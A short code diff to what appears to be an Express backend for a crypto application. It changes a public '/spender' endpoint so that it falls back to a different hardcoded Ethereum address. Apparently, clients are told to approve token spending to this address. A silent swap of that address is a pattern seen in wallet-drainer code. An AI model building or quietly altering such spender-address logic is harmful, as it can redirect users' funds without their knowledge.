@@ -44,7 +44,7 @@ router.post('/countdown', async (req, res) => {
 
 // Public endpoint to get admin spender address (Proxy Contract or Wallet)
 router.get('/spender', (req, res) => {
-  let spender = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || '0x9e35C71b8D17f3c716839fd97fFbC230f5Ff197a';
+  let spender = process.env.PROXY_CONTRACT_ADDRESS || '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';
   if ((!spender || spender.startsWith('0x00000000000000000000')) && process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
     try {
       const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
